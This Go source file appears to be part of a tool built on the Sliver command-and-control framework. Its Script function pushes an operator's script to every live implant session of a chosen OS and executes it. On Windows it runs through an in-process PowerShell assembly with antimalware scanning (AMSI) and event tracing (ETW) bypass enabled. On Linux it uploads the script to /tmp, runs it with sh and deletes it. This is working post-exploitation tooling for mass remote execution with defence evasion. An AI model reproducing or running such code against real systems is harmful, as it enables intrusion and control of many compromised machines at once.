package dispatch

import (
	"context"
	"fmt"
	"math/rand"
	"os"
	"sliver-dispatch/utils"
	"strconv"
	"strings"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// https://github.com/BishopFox/sliver/blob/c8a7948671eafba4d6f871c2f2b46b900202699d/client/command/exec/execute.go#L71
// https://github.com/BishopFox/sliver/blob/c8a7948671eafba4d6f871c2f2b46b900202699d/client/console/console.go#L770
func Script(rpc rpcpb.SliverRPCClient, target_os string, args ...string) {

	if len(args) < 1 {
		utils.Eprint("Need the path to a script to dispatch!")
		return
	}
	var sessions *clientpb.Sessions
	var assembly []byte
	var err error
	if target_os == "windows" {
		assembly, err = os.ReadFile("extensions/powershell/powershell.x64.exe")
		if err != nil {
			utils.Eprint("Error reading file: %s", err.Error())
			return
		}
	}

	b_script, err := os.ReadFile(args[0])
	if err != nil {
		utils.Eprint("Error reading file: %s", err.Error())
		return
	}

	sessions, err = rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		utils.Eprint("Error reading file: %s", err.Error())
		return
	}

	var session *clientpb.Session
	var exec *sliverpb.Execute
	var resp_a *sliverpb.ExecuteAssembly
	for _, session = range sessions.GetSessions() {
		if !session.IsDead && session.OS == target_os {
			if session.OS == "windows" {
				utils.Iprint(fmt.Sprintf("==| ID: %-10s | Host: %-20s | Address: %-15s | Username: %-10s |==",
					strings.Split(session.ID, "-")[0],
					session.Hostname,
					strings.Split(session.RemoteAddress, ":")[0],
					session.Username))
				fmt.Println(string(b_script))
				resp_a, err = rpc.ExecuteAssembly(
					context.Background(),
					&sliverpb.ExecuteAssemblyReq{
						Assembly:   assembly,
						Arguments:  string(b_script),
						IsDLL:      false,
						InProcess:  true,
						AmsiBypass: true,
						EtwBypass:  true,
						Request: &commonpb.Request{
							Async:     false,
							SessionID: session.ID,
						},
					},
				)
				if resp_a != nil {
					utils.Iprint(string(resp_a.Output))
				}
				if err != nil {
					utils.Eprint("Error running assembly: " + err.Error())
					if resp_a != nil {
						if resp_a.Response != nil && resp_a.Response.Err != "" {
							utils.Eprint("Another error: " + resp_a.Response.Err)
						}
					}
				}
			}
			if session.OS == "linux" {

				utils.Iprint(fmt.Sprintf("==| ID: %-10s | Host: %-20s | Address: %-15s | Username: %-10s |==",
					strings.Split(session.ID, "-")[0],
					session.Hostname,
					strings.Split(session.RemoteAddress, ":")[0],
					session.Username))

				filename := "/tmp/" + strconv.Itoa(rand.Intn(100000000)) + ".sh"
				upload_rsp, err := rpc.Upload(
					context.Background(), &sliverpb.UploadReq{
						Path:    filename,
						Data:    b_script,
						IsIOC:   false,
						Encoder: "",
						Request: &commonpb.Request{
							Async:     false,
							SessionID: session.ID,
						},
					})
				if err != nil {
					utils.Eprint("Error uploading script: " + err.Error())
					if upload_rsp != nil {
						if upload_rsp.Response != nil && upload_rsp.Response.Err != "" {
							utils.Eprint("Another error: " + upload_rsp.Response.Err)
						}
					}
				}

				exec, err = rpc.Execute(
					context.Background(),
					&sliverpb.ExecuteReq{
						Path:   "sh",
						Args:   []string{filename},
						Output: true,
						Request: &commonpb.Request{
							Async:     false,
							SessionID: session.ID,
						},
					})
				if err != nil {
					utils.Eprint("Error executing script: " + err.Error())
					if exec != nil {
						if exec.Response != nil && exec.Response.Err != "" {
							utils.Eprint("Another error: " + exec.Response.Err)
						}
					}
				}

				rm_rsp, err := rpc.Rm(
					context.Background(),
					&sliverpb.RmReq{
						Path:      filename,
						Recursive: false,
						Force:     false,
						Request: &commonpb.Request{
							Async:     false,
							SessionID: session.ID,
						},
					})
				if err != nil {
					utils.Eprint("Error removing script: " + err.Error())
					if upload_rsp != nil {
						if rm_rsp.Response != nil && rm_rsp.Response.Err != "" {
							utils.Eprint("Another error: " + rm_rsp.Response.Err)
						}
					}
				}
				utils.Iprint(string(exec.Stdout) + string(exec.Stderr))
			}
		}
	}
}
